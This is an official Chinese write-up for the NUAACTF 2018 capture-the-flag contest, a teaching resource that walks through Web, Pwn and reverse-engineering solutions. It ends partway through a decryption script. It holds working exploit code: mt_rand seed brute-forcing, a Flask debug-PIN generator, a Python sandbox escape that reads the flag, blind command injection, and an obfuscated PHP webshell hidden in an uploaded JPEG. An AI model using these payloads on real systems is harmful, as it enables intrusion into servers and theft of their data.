---
title: NUAACTF_2018 官方wp
authorId: zedd
tags: wp
tags:
 - nuaactf
 - writeup
categories:
 - Writeup
date: 2018-12-25 12:23:41
---

2018南京航空航天大学第三届“补天杯”信息安全竞赛解题报告（2018NUAACTF Writeup）

<!--more-->

[TOC]

## Web

### Web1    Asuri-Information-System

#### 题目描述

```
http://ctf.asuri.org:8001

听说有五个很厉害的人，一个是admin,一个是admin1,一个是admin2,一个是admin3,一个是admin4。听说打败他们其中一个就可以拿到flag啦

flag格式为NUAACTF{.*}
```

#### 信息收集

根据题目描述，我们要做的肯定就是要去登录`admin[1-4] || admin`了。

首先进入题目界面，发现题目功能很简单，首页只提供注册登录两个功能。

![](https://ws1.sinaimg.cn/large/64ef14dcly1fyhj2xspy3j21ma1641kx.jpg)

![](https://ws1.sinaimg.cn/large/64ef14dcly1fyhj2z3q4rj21ne16ukee.jpg)

我们先随便登录注册一下，进去后发现有个重置密码的功能。

![](https://ws1.sinaimg.cn/large/64ef14dcly1fyhj5gec83j21p01687wh.jpg)

![](https://ws1.sinaimg.cn/large/64ef14dcly1fyhj5htvfcj21kk1501fx.jpg)

重置一下抓包看看。

![](https://ws1.sinaimg.cn/large/64ef14dcly1fyhjfizh8pj21yg150qay.jpg)

然后真的发现自己邮箱里面多了一封重置密码的邮件。

![](https://ws1.sinaimg.cn/large/64ef14dcly1fyhjhb6wn6j211o0kkjuq.jpg)

扫目录可以得到`www.zip`，发现题目的所有基本源码。

![](https://ws1.sinaimg.cn/large/64ef14dcly1fyhjksc5oij20o20hitam.jpg)



#### 思路

基本的信息如上，然后我们可以根据已有信息来看，从那个重置密码请求包来看，貌似我们可以控制重置用户的用户名。那我们是不是可以重置`amdin`的密码，通过什么方式登录上呢，而且那个请求包还有回显了一个`int`也比较奇怪，看起来像是`var_dump()`出来的数据。

通过大概的代码审计，题目用了在`sql`语句的地方预编译，所以没什么办法注入得到`admin`

查看`handler`源码:

```php+HTML
<?php
require "./config.php";
require "./email.php";

function generatePasswd(){
    mt_srand((double) microtime() * 1000000);
    var_dump(mt_rand());
    return substr(md5(mt_rand()),0,6);
}

function changePasswd($username, $password){
    $password = md5($password);
    $stmt = $GLOBALS['dbh']->prepare("UPDATE users SET password = ? WHERE username = ?");
    $stmt->bind_param('ss', $password, $username);
    $stmt->execute();
    if ($stmt->affected_rows === 1){
        echo "<script>alert(\"Success!\");history.back(-1);</script>";
        return;
    }
    else
        echo "<script>alert(\"Error!\");history.back(-1);</script>";
    $stmt->free_result();
    $stmt->close();
}


function getEmail($username){
    if ($username){
        $stmt = $GLOBALS['dbh']->prepare("SELECT email From users where username = ?");
        $stmt->bind_param('s', $username);
        $stmt->bind_result($email);
        $stmt->execute();
        if($stmt->fetch()){
            return $email;
        }
        else
            return "error!";
        $stmt->free_result();
        $stmt->close();
    }
    else{
        return "error!";
    }
}

$username = isset($_POST['username']) ? trim($_POST['username']) : NULL;
$email = getEmail($username);
if ($email == "error!"){
    echo "Error!";
    die();
}
$passwd = generatePasswd();
if(sendMail($email,$passwd)){
    changePasswd($username,$passwd);
}
else{
    echo "<script>alert(\"Error! Check your Email address plz!\");history.back(-1);</script>";
}

?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title>Asuri-Team Managment System</title>
</head>
<body>

</body>

```

通过代码审计，我们可以看到传入的`username`到了`getEmail`这个函数，这个函数用了预编译，所以我们没什么办法注入。这个函数就是根据`username`返回对应`email`，通过`generatePasswd()`产生随机密码，通过`sendMail()`发送密码到邮箱，最后用`changePasswd()`来修改数据库中的密码。

整个逻辑基本清楚了，所以我们是可以通过传入一个`username=admin`来重置管理员的密码。但是怎么登录成`admin`呢，我们是不是可以通过爆破随机密码或者破解随机密码来登录呢。

我们重点看看`generatePasswd()`

```php
function generatePasswd(){
    mt_srand((double) microtime() * 1000000);
    var_dump(mt_rand());
    return substr(md5(mt_rand()),0,6);
}
```

我们可以看到，页面上的`int(2055522123)`即是`var_dump(mt_rand());`的显示结果。

可以看看

```php
void mt_srand ([ int $seed ] )
用 seed 来给随机数发生器播种。 没有设定 seed 参数时，会被设为随时数。

Note: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。
```

然后随机数种子是`(double) microtime() * 1000000`

```php
mixed microtime ([ bool $get_as_float ] )
microtime() 当前 Unix 时间戳以及微秒数。本函数仅在支持 gettimeofday() 系统调用的操作系统下可用。

如果调用时不带可选参数，本函数以 "msec sec" 的格式返回一个字符串，其中 sec 是自 Unix 纪元（0:00:00 January 1, 1970 GMT）起到现在的秒数，msec 是微秒部分。字符串的两部分都是以秒为单位返回的。

如果给出了 get_as_float 参数并且其值等价于 TRUE，microtime() 将返回一个浮点数。

Note: get_as_float 参数是 PHP 5.0.0 新加的。
```

所以这里`microtime() * 1000000`是不超过7位数的，而且第一次随机数我们已经得到了，我们可以通过爆破随机数种子来得到随机数。

贴一个自己写的`php exp`

```php
<?php
// echo ((double) microtime() * 1000000)."\n";
// mt_srand((double) microtime() * 1000000);
// var_dump(mt_rand());
// echo substr(md5(mt_rand()),0,6);


// int(1409622410)
// bc700b

$seed = 0;
for($i = 0;$i < 1000000; $i++){
    mt_srand($i);
    $str = mt_rand();
    if($str === 1796651235){
        $seed = $i;
    }
}
echo $seed."\n";
mt_srand($seed);
mt_rand();
echo substr(md5(mt_rand()),0,6);
```

猜解得到密码登录就可以得到`flag`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1650iujj21kg16g7wh.jpg)

这里避免给大家竞争随机…就给了5个`amdin`，其实应该注册一个就对应给一个`admin`，但是感觉5个应该差不多了...



### Web2    男航理工大学选课系统

#### 题目描述

```
http://ctf.asuri.org:8003

小火汁，听说你想选课？

flag格式为NUAACTF{.*}
```

#### 信息收集

题目设置非常简单

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1dv0agwj228017wn4v.jpg)

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1fdbkonj228017ygtf.jpg)

就一个登录注册界面。然后给了一个`www.zip`的附件，放出了关键源码。

然后，随便点一个选课，就报错了。

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1lzc5jej228017qdry.jpg)

再看看源码，其中在`user.py`中发现

```python
@users.route('/asserts/<path:path>')
def static_handler(path):
    filename = os.path.join(app.root_path,'asserts',path)
    if os.path.isfile(filename):
        return send_file(filename)
    else:
        abort(404)
```



#### 解题

这个题熟悉`flask`的会发现，那个报错页面其实就是开启了`debug`的界面，我们可以利用`pin`码来认证`debug`界面进行命令执行。

而关于`pin`码，我看赛时很多队伍都采取爆破的方式，导致输入过多，就不能再输入了。就导致我赛时只能人肉运维重置`web2`。

```
md5_list = [
    'root', #当前用户，可通过读取/etc/passwd获取
    'flask.app', #一般情况为固定值
    'Flask', #一般情况为固定值
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc', #可通过debug错误页面获取
    '2485377892354', #mac地址的十进制，通过读取/sys/class/net/eth0/address获取mac地址  如果不是映射端口 可以通过arp ip命令获取
    '0c5b39a3-bba2-472c-a43d-8e013b2874e8' #机器名，通过读取/proc/sys/kernel/random/boot_id 或/etc/machine-id获取
    ]
```

生成`pin`码的代码

```python
def get_pin(md5_list):
	h = hashlib.md5()
	for bit in md5_list:
		if not bit:
			continue
		if isinstance(bit, unicode):
			bit = bit.encode('utf-8')
		h.update(bit)
	h.update(b'cookiesalt')
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num
	return rv
```

拿到pin码便可执行命令。

具体可以参考[Flask debug pin安全问题](https://xz.aliyun.com/t/2553)

贴一下这题得到的`exp`

```python
import hashlib

def get_pin(md5_list):
	h = hashlib.md5()
	for bit in md5_list:
		if not bit:
			continue
		if isinstance(bit, unicode):
			bit = bit.encode('utf-8')
		h.update(bit)
	h.update(b'cookiesalt')
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  for x in range(0, len(num), group_size))
			break
	else:
		rv = num
	return rv

name = get_name()
md5_list = [
    'ctf',
    'flask.app',
    'Flask',
    '/usr/local/lib/python2.7/dist-packages/flask/app.pyc',
    '2485378285570',
    ''
    ]

print get_pin(md5_list)
```



这里可能比较坑的是`/usr/local/lib/python2.7/dist-packages/flask/app.pyc`跟`machine_id`是空两处。不过通过几次尝试也都可以尝试出来。难度并不算大。



然后就是命令执行，一个简单没有任何过滤的`Python`沙盒，方法很多。

这里简单给个事例

```python
[console ready]
>>> ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' )
'APP\nflag\nrun.py\ntest.py\nwww.zip\n'
>>> ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("cat ./flag").read()' )
'NUAACTF{F14sssskkkrrr_D3Bug_n0t_S4f3}'
```

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyi9o8be0bj227616s7hc.jpg)



### Web3    张哥的金牌之旅

#### 题目描述

```
http://ctf.asuri.org:8003/

做完A+B你就可以拿金牌了。（你可能需要一个逆向哥哥来帮你

小水管服务器，为了顺畅做题请大家不要用扫描器，而且这题用不到扫描器！！！

flag格式为NUAACTF{.*}
```

#### 信息收集

打开发现是个`java`框架。

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyia0yt2bij228017s47p.jpg)

提供了简单的登录注册。

然后发现只有`A+B`问题可以点

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyiauiinyrj227w180jx9.jpg)

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyiaul3dphj228017ogqx.jpg)

代码提交页面提供代码提交，查看最后一次提交的代码功能。

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyiaw8k1jjj2280180jwx.jpg)

引用代码提示

```
请以代码文件为url，例如http://mysite.com/main.c，仅支持c,cpp,java,py,js,cs的提交
```

然后提交一个`https://raw.githubusercontent.com/php/php-src/master/ext/zlib/zlib.c`，发现返回代码过多，再找个几行代码的`https://gitee.com/CheungSSH_OSC/CheungSSH/raw/master/bin/DataConf.py`

返回提示成功，查看上一次提交代码，发现以源码方式返回。还有个下载代码的功能，得到一个文件名为用户名经过md5后的`txt`文件。



#### 思路

既然引用代码处，可以引用`http`协议的`url`，那我们可以试试用`file`如何。

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyibr7mtsvj21yo13444v.jpg)

发现是`forbidden`，通过`fuzz`我们可以得到`jar netdoc`两个`java SSRF`支持的协议没有被`ban`，而且需要再最后加入`?1.c`来绕过后缀检测

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyibz19mwyj21yu18qwmv.jpg)

然后查看最后一次代码提交，发现并没有什么改变。

试试`netdoc`，传入`netdoc:///?1.c`

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyidhkjy5wj21z218sguq.jpg)

发现可以得到回显

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyidhhna5tj21ys18gww2.jpg)

但是直接请求`flag`，发现被`ban`掉了，所以我们得另寻他路。

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyidkqxytej21yu190k01.jpg)



#### 突破口

通过查看一系列文件，发现如果直接读`class`文件的话，直接展示出来了`class`二进制文件，那我们下载下来会不会也是`class`文件的形式呢

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyidsve7dlj21yq0v0n5d.jpg)

下载下来后，我们用`file`看一下，果然是个`java class`文件

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyidsyg0uaj2102038adb.jpg)

用`JD-GUI`打开得到源码

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyidw0hu30j228018kdpv.jpg)

题目描述说需要逆向师傅其实指的就是这里需要逆向`class`文件，（其实也不需要…直接用`JD-GUI`直接就能看了...

这里省略了其他源码的审计。

然后看到貌似多出的这个`User.class`类，然后发现了比较敏感的`readObject()`函数，`java`反序列化漏洞特征，可能存在`java`反序列化漏洞

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyidyds8e7j227w18uk1b.jpg)

然后找到其利用的地方，发现在`netdoc:///app/webapps/ROOT/WEB-INF/classes/org/nuaa/tomax/logindemo/controller/UserController.class`调用了`User`类。

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyie2v8gsnj2280196qfm.jpg)

`UserController.class`的关键部分:

```java
@PostMapping({"/record"})
  public void record(long userId, HttpSession session, String cmd)
    throws Exception
  {
    Timestamp timestamp = new Timestamp(System.currentTimeMillis());
    UserEntity user = (UserEntity)session.getAttribute("user_" + userId);
    if (cmd != null)
    {
      User mUsr = new User(user.getId(), user.getUsername(), cmd, timestamp);
      SysUtil.recordCmd(mUsr);
    }
  }
```

在看到`SysUtil.class`:

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyieei3nmoj2280192tlm.jpg)

![](https://ws1.sinaimg.cn/large/64ef14dcgy1fyieefah7pj227y18qgwt.jpg)

发现竟然有部分貌似真的需要逆向，但是其实仔细往下看，利用点跟上面那段代码没太大关系。

看到`recordCmd()`，可以说是非常标准的`java`反序列化的代码了。

```java
public static void recordCmd(User user)
    throws IOException, ClassNotFoundException
  {
    FileOutputStream fos = new FileOutputStream("object");
    ObjectOutputStream os = new ObjectOutputStream(fos);
    
    os.writeObject(user);
    os.close();
    
    FileInputStream fis = new FileInputStream("object");
    ObjectInputStream ois = new ObjectInputStream(fis);
    
    User outUsr = (User)ois.readObject();
    ois.close();
  }
```

接着我们回到`User.class`，很明显，这里可以控制传入`cmd`，我们再看看`User.class`的关键代码:

```java
private static final String[] BLACKLIST = { "$", "{", "}", "`", "base64", "&", ";", "||", "%", "(", ")", "rm", "echo"};

public User(long id, String username, String cmd, Timestamp time)
{
    this.id = id;
    this.username = username;
    this.cmd = cmd;
    this.time = time;
}

private void readObject(ObjectInputStream in)
    throws Exception
  {
    in.defaultReadObject();
    if (checkCmd(this.cmd).booleanValue())
    {
      String cmd_pre = "sleep $(";
      String cmd_suf = ")";
      String exec = cmd_pre + this.cmd + cmd_suf;

      String[] cmds = { SysUtil.asciiToString("47,98,105,110,47,98,97,115,104"), SysUtil.asciiToString("45,99"), exec };
      SysUtil.execCmd(cmds);
    }
  }

  public Boolean checkCmd(String cmd)
  {
      for (String symbol : BLACKLIST) {
          if (cmd.contains(symbol)) {
              return Boolean.valueOf(false);
          }
      }
      return Boolean.valueOf(true);
  }
```

`cmds`转换为`ascii`就是

```java
String[] cmds = { "/bin/bash", "-c", exec };
```

`exec`就是传入的`cmd`，然而这里利用点比较尴尬，因为我们传入的代码是被`exec`是被`sleep $()`给包围起来的，而关键的一些绕过都进了黑名单

```java
private static final String[] BLACKLIST = { "$", "{", "}", "`", "base64", "&", ";", "||", "%", "(", ")", "rm", "echo"};
```

这里我们可以使用命令执行盲注的形式进行对`flag`猜解。稍后我会详细写一篇文章讲解命令盲注的方式。

我们可以采用`cat /flag | cut -c 1 | tr N 10`这样的形式对`flag`进行猜解。

- `cat /flag`读取`/flag`中的内容
- `cut -c 1`截取第一个字符
- `tr N 10`用`10`来代替`flag`中的字母`N`

所以，通过把`flag`中的内容读出来之后，用字母代替进行`sleep`，如果猜解对的话，并且排除网络原因，页面会延缓`5s`才返回，所以我们可以利用这个特性把`flag`猜解出来。

其实这里设置得不太好，应该把`flag`改成全英文比较好一些得到`flag`。也可以用`burp intruder`来猜解。



### Web4 Pentest

####	题目描述

```
I love Pentest!

做出来的师傅请不要搅屎。 http://ctf.asuri.org:8004
```

####	解题

首先通过扫目录扫出上传页面，然后利用上传处理的错误逻辑，上传带一句话的图片(图片会经过gd库解析)，解析出错不会删除上传的文件（可以在 index 页面看到）， 然后文件包含拿 shell, 得到 web 目录下的 Import_notes 文件，知道需要打登录内网 samba 拿 flag, 于是代理进内网。由于用了 disable_function , 通过下面的文章进行绕过

```
https://www.freebuf.com/articles/web/192052.html
```

samba 共享里面有一半 flag , 还需要利用漏洞打内网的另外一台 tomcat ,拿到 shell ， 读取第二部分的 flag

具体利用步骤
通过扫目录扫到 `upload.php` , 可以上传图片，上传后会用 gd 对图片进行二次渲染， 由于代码逻辑不当，当渲染失败时图片依然会保存在服务器上，可以通过 `index.php` 看到引用的 `url`.



然后上传文件

![](https://ws1.sinaimg.cn/large/006daSSqgy1fy8sxqzmwjj31ea0hx78u.jpg)

```
import requests

session = requests.Session()

paramsPost = {"submit": "\xe4\xb8\x8a\xe4\xbc\xa0"}
paramsMultipart = [('upload_file', ('hac425.jpg', "\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00\x00\x00\x00\x00\x00\xff\xe10\xcaExif\x00\x00MM\x00*\x00\x00\x00\x08\x00\x04\x011\x00\x02\x00\x00\x00\x0b\x00\x00\x10J\x87i\x00\x04\x00\x00\x00\x01\x00\x00\x10V\x88%\x00\x04\x00\x00\x00\x01\x00\x00 \xa2\xea\x1c\x00\x07\x00\x00\x10\x0c\x00\x00\x00>\x00\x00\x00\x00\x1c\xea\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<?php \x24VsLC=create_function(str_rot13('\x24').chr(96600/840).str_rot13('b').str_rot13('z').chr(0346-0201),base64_decode('ZQ==').base64_decode('dg==').base64_decode('YQ==').chr(0247370/01432).str_rot13('(').chr(0x6204/0x2b9).base64_decode('cw==').base64_decode('bw==').base64_decode('bQ==').base64_decode('ZQ==').chr(0x13f-0x116).chr(0x397-0x35c));\x24VsLC(base64_decode('NDE3N'.'jc4O0'.'BldkF'.'sKCRf'.''.chr(0x3dc-0x387).str_rot13('R').chr(423-366).chr(0204170/01446).base64_decode('Vg==').''.''.chr(01157-01051).chr(0x10ca2/0x256).str_rot13('k').chr(0x217-0x1bf).chr(0x5fa5/0x127).''.'k7MTI'.'1MzAz'.'NDs='.''));?>", 'image/jpeg'))]
response = session.post("http://192.168.245.142:6655/upload.php",
                        data=paramsPost, files=paramsMultipart)

```



然后在利用 文件包含漏洞拿 shell, 拿到 shell 之后会发现一个重要的文件



![](https://ws1.sinaimg.cn/large/006daSSqgy1fy8syh9uwzj30se0i4gmx.jpg)

文件里面有 `samba` 的账号密码。

```
机智的我把重要文件都丢内网 samba了， 这里备忘个账户/密码： hac425/123456
```



通过这个文件知道 flag 应该在内网的 samba 服务器， 于是上传 busybox+reGeorg ,分别用于查看 ip 和代理。

通过扫描可以知道开启 samba 的机器，然后密码登录拿 flag. 获得提示去扫描其他常见的服务， 80,8080 等，可以找到 tomcat , 于是此时可以尝试利用漏洞打。

## Pwn

### overflow

简单栈溢出，用了随机数模拟了canary，本地生成随机数即可。

### kvm

简单的kvm，只需要在vm里面执行端口写操作即可。

### password_checker

`snprintf` 误用， 它返回的是格式化解析后形成的字符串的长度（及期望写入目标缓冲区的长度），而不是实际写入 目标缓冲区的内存长度。

```
    int off = snprintf(buf, 0x100, "name:%s&", input);
    ...........................
    ...........................    
    ...........................
    // off 可能会比较大，出现越界写
    off = snprintf(buf + off, 0x100 - off, "pwd:%s", input);

```

所以利用 `snprintf` 让 off 移动到返回地址的位置， 然后写返回地址为 getshell 函数的地址。

具体看 `exp` 和源码



### type_confusion

类型混淆，可以先释放一个 c1类的 obj, 然后分配一个 c2 类的 obj, 然后利用 see c1 obj 的功能调用虚函数，会调用 c2 的虚函数，c2 的相应虚函数的作用就是 system("sh)

```
int c2::dump()
{
    system("sh");
}
```

具体看 `exp` 和源码

## Rev

### stupid_contract_challenge[rev]

简单solidity逆向，源码如下

```sol
pragma solidity ^0.4.25;

contract stupidChallenge{
    bytes32 seed = 0xaaa0adabb79fb8b9bca5a8938fa3a2b8415250476c705b525f5f565d5456124e;
    function generateFlag() public returns(bytes){
        bytes memory finalFlag = new bytes(seed.length);
        uint i;
        for(i = 0;i<seed.length/2;i++) {
            finalFlag[i]=seed[i]^0xcc;
        }
        for(;i<seed.length;i++) {
            finalFlag[i]=seed[i]^0x33;
        }
        return finalFlag;
    }
}

```

直接把字节码扔 https://ethervm.io/decompile 即可

### variant_of_cat

智能合约，整数下溢
先调用`fightAsuriMonster`使得攻击力下溢，再次调用`fightBoss`即可

### STG TouHou

是一个彻头彻尾的车万游戏呢。

#### 正常通关

通关游戏，会把flag打印在屏幕上

#### 逆向分析

这个题目会告知大家这个程序叫做四圣龙神录，其实是可以从github上找到源码的。Rev的题目拿到了源码，那基本上就做出来了。当然源代码肯定没有flag相关的逻辑，可以结合源代码对程序进行审计。
首先逆向日常搜索flag字符串，会发现如下的函数:

```C
void sub_4308D0()
{
  int v0; // eax

  if ( dword_D0CA74 == 1 )
  {
    v0 = sub_40E039(255, 255, 255);
    sub_40D837(0, 40, v0, "Flag:%s", (unsigned int)&byte_D0CA78);
  }
}
```

这个Flag很显然是刻意打印的，那么追踪一下这个byte_D0CA78

```C
signed int __cdecl sub_430730(char a1)
{
  signed int result; // eax
  char v2; // STD7_1
  signed int i; // [esp+E8h] [ebp-8h]
  signed int j; // [esp+E8h] [ebp-8h]

  for ( i = 0; i < 54; ++i )
    byte_AEE308[i] -= a1;
  for ( j = 0; ; j += 2 )
  {
    result = j;
    if ( j >= 54 )
      break;
    v2 = 16 * trans2num(byte_AEE308[j]);
    byte_D0CA78[j / 2] = trans2num(byte_AEE309[j]) + v2;
  }
  dword_D0CA74 = 1;
  return result;
}
```

会找到这个函数，可以看到这里又存储了一个全局变量。这里的运算相当于是将一个数字分成了高4bit和低4bit然后进行合并处理，那么我们继续回溯，检查这个`byte_AEE308`的来历，会找到另一段的程序逻辑:

```C
signed int __cdecl sub_430850(char a1)
{
  signed int result; // eax
  signed int i; // [esp+DCh] [ebp-8h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= 54 )
      break;
    byte_AEE308[i] ^= a1;
  }
  return result;
}
```

跟踪调用关系，会发现这两个函数是由同一个函数调用的:

```C
signed int __cdecl sub_430960(int a1, char a2)
{
  signed int result; // eax

  if ( a1 == 1 )
    return sub_405696(a2);
  if ( a1 == 2 )
    result = sub_402A09(a2);
  return result;
}

```

跟踪到外面，可以看到这样的逻辑

```C
       result = dword_D0C03C++ + 1;
        if ( dword_D0C03C == 1 )
          return sub_40A907(dword_D0C03C, 255);
        if ( dword_D0C03C == 2 )
          result = sub_40A907(dword_D0C03C, 19);
        return result;
```

结合东方（游戏逻辑！）一般来说都是先1后2，所以是先调用前面那个逻辑后调用后面的逻辑。于是根据调用顺序，我们能够写出解密脚本:

```python
import codecs
enc = [182,135,181,183,182,187,182,187,182,185,181,184,182,182,181,138,183,181,182,183,185,187,182,185,185,188,182,136,185,185,183,134,185,186,183,134,184,181,185,185,182,135,183,185,185,188,184,138,185,184,182,134,181,136 ]

def dec_one(enc, num):
    for i in range(len(enc)):
        enc[i] ^= num

def dec_two(enc, num):
    for i in range(len(enc)):
        enc[i] -= num

    tmp = 0
    ans = ''.join(chr(c) for c in enc)
    print(codecs.decode(ans,'hex'))


if __name__ == '__main__':
    dec_one(enc, 255)
    dec_two(enc, 19)
    # nuaactf{We1c0m3_2_G3nS0K4o}
```

### Middle

题目来源：因为难度定位是中等所以叫这个

#### 初步准备

对于想要做这个题目的人来说，想必也是有了一定的基础。比如说首先要认得这个程序是一个ELF文件是Linux下的可执行文件之类的。（其实我第一次做的时候就不会认这个，滑稽）
那么逆向首先无非准备几个工具

- 静态工具：IDA
- 动态分析工具：gdb
- 环境：Ubuntu

首先运行程序，发现程序两个行为：

- 输入`nuaactf{.+}`格式的字符串
- 如果输入完成，会让我们做一个C语言的题目

而且在运行的时候会发现，程序会在5秒之内结束。整个题目第一眼逻辑就有了

#### 静态辅助

掏出静态分析工具，前面一大段其实是字符串在计算对齐的内容，不是特别重要。整体分析就会发现其实是一个给字符串置0的操作。之后的第一个函数`sub_80485E4();`在打印欢迎内容，之后会遇到函数:

```C
  if ( ptrace(0, 0, 1, 0) < 0 )
  {
    puts("Hey guys, what are you doing?!not cheat me~");
    ++dword_804A0D8;
    exit(-1);
  }
```

这个`ptrace`上网查就会发现，这个函数会阻止动态调试，这里可以选择将这个内容patch掉，将二进制内容改成90（nop），跳过这个内容。或者gdb调试直接跳过这个内容也可以，反正有办法都行。

之后来到这个地方的逻辑:

```C
  puts("Hey you, what's your password?");
  puts("format:nuaactf{}, length:24");
  for ( i = 0; i < 24; ++i )
    __isoc99_scanf("%c", i + a1);
  puts("em?ok, you can get in...");
  for ( j = 0; ; ++j )
  {
    result = j;
    if ( j >= 24 )
      break;
    *(_BYTE *)(j + a1) = ((int (__cdecl *)(_DWORD))loc_8048628)(*(unsigned __int8 *)(j + a1));
  }
```

可以看到这里的内容就是让我们输入一段类似flag的内容，不过注意到，最后会对数组`a1`的每一个元素进行更新，但是似乎是一个没有被识别成函数的内容，跟进去查看，发现一些奇怪的指令阻止了程序的正常解析，不过仔细观察，似乎这个跳转根本就不会调用到这些神奇的指令，利用前面教过的patch方法，就能够修改掉程序内容，看到正确的程序内容:

```C
  v2 = 0;
  for ( i = 0; i <= 7; ++i )
    v2 |= (((signed int)a1 >> i) & 1) << *(_BYTE *)(i + 0x804A0C2);
  return v2
```

这个巨大的数字其实是一个地址，里面内容为

```
.data:0804A0C2                 db    3
.data:0804A0C3                 db    7
.data:0804A0C4                 db    2
.data:0804A0C5                 db    1
.data:0804A0C6                 db    6
.data:0804A0C7                 db    4
.data:0804A0C8                 db    5
.data:0804A0C9                 db    0
```

理解一下，就相当于是一个数组的下标i在遍历。总的分析这个算法，其实就是**将一个字节的每一bit的顺序重新映射到一个新的位置上**具体对应关系为:

```
0 1 2 3 4 5 6 7
3 7 2 1 6 4 5 0
```

#### C语言课程

然后有一个让大家轻松一下的环节，让大家输入一个程序的运行结果。这个一看就是宏定义的错误实例，即会产生一个非预期的答案

```
1+3*1+4 = 8
```

不过其实整个考出来跑也是可以的~

#### 最后的答案

最后一段逻辑如下

```C
  v3 = -66;
  v4 = 116;
  v5 = 48;
  v6 = 48;
  v7 = -80;
  v8 = 124;
  v9 = -68;
  v10 = -14;
  v11 = 42;
  v12 = 48;
  v13 = 48;
  v14 = 16;
  v15 = 98;
  v16 = -74;
  v17 = 116;
  v18 = -26;
  v19 = -92;
  v20 = 88;
  v21 = 124;
  v22 = -26;
  v23 = 80;
  v24 = 124;
  v25 = 16;
  v26 = 118;
  puts("Well,Well,You get here right?");
  if ( !dword_804A0D8 || dword_804A0D0 )
  {
    puts("En?No No No you are not clever~");
  }
  else
  {
    puts("!!! Hey !!!");
    puts("Do you remember your password?");
    for ( i = 0; i <= 23; ++i )
    {
      *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ dword_804A0D4;
      if ( *(&v3 + i) != *(_BYTE *)(i + a1) )
        break;
    }
    if ( i == 24 )
      puts("YOU ARE RIGHT!THE KEY IS FLAG!");
    else
      puts("O?Nearly");
  }
```

可以看到离正确答案很近了~
不过会发现，不是那么容易能够进入这个匹配逻辑。仔细观察会发现，变量`dword_804A0D8`在一开始的`ptrace`处出现过，而`dword_804A0D0`则是会在一个handler里面出现，这个handler其实是注册的一个信号事件，5秒后自动跳转为1（这个地方其实是坑调试器用的，因为调试器可以选择忽略alarm但是此时变量依然会被置为1）不过一样可以用强硬的手段跳过这段逻辑。之后发现是一段关键逻辑比较

```C
      *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ dword_804A0D4;
      if ( *(&v3 + i) != *(_BYTE *)(i + a1) )
        break;
```

其中`dword_804A0D4`存放了C语言那段中，我们输入的正确答案。如果输入正确答案，则会通过与上面出现那一大段数字（其实是一个数组）进行异或，得到答案。于是总结下来，我们可以得到整体逻辑:

- 首先对输入进行bit变化
- 与C语言输入的正确答案进行异或
- 与程序内部的数据比较

因此可以写出解密逻辑:

```python
#   -*- coding:utf-8    -*-

bit_map = [7, 3, 2, 0, 5, 6, 4, 1]
check = [190, 116, 48, 48, 176, 124, 188, 242, 42, 48, 48, 16, 98, 182, 116, 230, 164, 88, 124, 230, 80, 124, 16, 118]
right_answer = 8


def bit_detrans(num):
    tmp_u = 0
    for i in range(8):
        tmp = (num >> i) & 0x1
